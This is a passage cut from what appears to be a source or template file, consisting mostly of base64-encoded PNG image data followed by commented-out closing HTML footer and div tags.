///////////////////////////////////////////////////8iixE2AAAA2XRSTlMAco+RB4YCr2L+Aa1FTo009cf3DvN2+s/hvNmqT/nqHCEJ2gazN8H7bzz9D+Ns7ev48S2rChmk1lqS3yUFQb07yaBI9CrT/MCCL9GUEu6aa0l63eDmAx9lRz0IjF0dxrnnfHidIw0XthAzTCfbd97o2FdcEYEEyNwLP7phha6yJu8bE1BxtShVMBrLZKfMv4ix0AxmaL6JTXsi9o5UFruwpSlS4oBCis1WwvC3NqxunF7FJBQyqHlf1ZA4OuVjPisgQJdDmeQuw39ZRjWmoWqTRFFbLKLUYEsVUHtrhQAABDhJREFUeF6llfVXXFcQxwe2XfYtm6wBC+yiEkjRYKGEQEgJDQTXIEGj0sYatyZpG20jjVbd3d3dXea/6czeu/ftXU45nPL5Yc539vD47Ltv3iwI7FVlBZ5k/16Q7D2T6fqg9sMs0GhyOBwfgc4AfdYE/5cmHwrWref2wkHZJuZokhgkFmuC+UjE/IegNy8v732YhsULMERmOsDJd1TreWCK+Gk7hLFrOvF1iHj9NN4GF5osXO9dxsF1fixodkaKcTuYbMNZiDOCIndV3cVqDknnqBgHvACOW/m010SKEweVIKtrNuK3kLiRD7C8FgXGMDBpbL4tUoy3KEEUzkLsLSLTw3Zx86eEeDw0OgZi3IOaeB7ic6/Lfkcr4s3h4k8/G12W1PY5MCeiouL5AKOIK8AMnv7BfT67sAVy6COAO0i0oAIEq4NjlmQFySPUxWtip0HHI/u5iMYbpvjjZhTc/Ql1hWgSC8SxVNGkBsapAiyhehlCWJBYrtoN1Pk0MVQiJiwCJj0FsR6UeGmcEo01TBW334CS3K9Z3EfFWAWStODFnmvKtZXaRZq4zyPvAN5EdB1R4rTb+UEUdrTfw/dshQGLZQWlUxbCBuDMpebLybyJGPEF4G0qS5TnRQySDWCeJr6iieEs1TrqXjB48pT4EIVOHhX7N5T6I4fLR9mfz+mrAiTgXSpPgGQlSjaC5Dg1Fl2cX4zopu5ZxJ49SnyEbuSccFhHaOYixCcoNsvRuSuBxTyVARBkJVPz8mYqm7NA0MDnp4uhnVzPwDGq+0GJeUYHQPATYuNRXXyA4lKQ1LM4M+whTlBuPbox/F3NoLw1QrwzGbFrDxWf1RS3Iab8OkfAr1GOLvYjGhnhzw94xlvkZN1E+SWA50kWVwGCXMQtEWIIkIyX9JNgiu9EnYAufhWxADQxn3eN6Mt4Ve+Uz6ASBDSrJZFimIfMIQgTj6LOfl3sRqzWxXyXa4HpwNBzuN/8+bM2IrqmiHmLYO6mcPEkYkK/zeSwLo5FbKzRxN1U5nO343H1HuVvobjby3ETpW5dzFSi3F9K3Cn+j0YNCeaKOETxPZB8weJYKvXU9O6jcF+6MGxHIptH5ykKB6eKvaWlpeWa+DWxoCRWEYoRz4hUR5p9IFjlYnE/FWN5+oaHkOgEgRiVpJyKeF4zVbpYoYmBF9ZVuzgx/1lgeB23XgDGvptXsZXjtWQkoLwYFeusIFnbg4pm64zEh3laRoadv6+8XIT4LTC8M322X658J3eT+2rgr8kSZAAeU4aFXlA41cY3OmBGYjhegiY/AnPSZf5IDClPyqi4gdMpoi9rgTCcifKv7oUZiuH7LpT0hC4ajlNiiE8QnuK/x4UYVq/I9BTVbgOdNfGXEkuq2x4FE1t0dDREQp/ZZOyd4/cVpf75x2+DEKLv50sF3SMXxVANuVPH3BP/gIOu+Rdg4U4GPLb7XQAAAABJRU5ErkJggg==" />
//   </footer>
// </div>
// </div>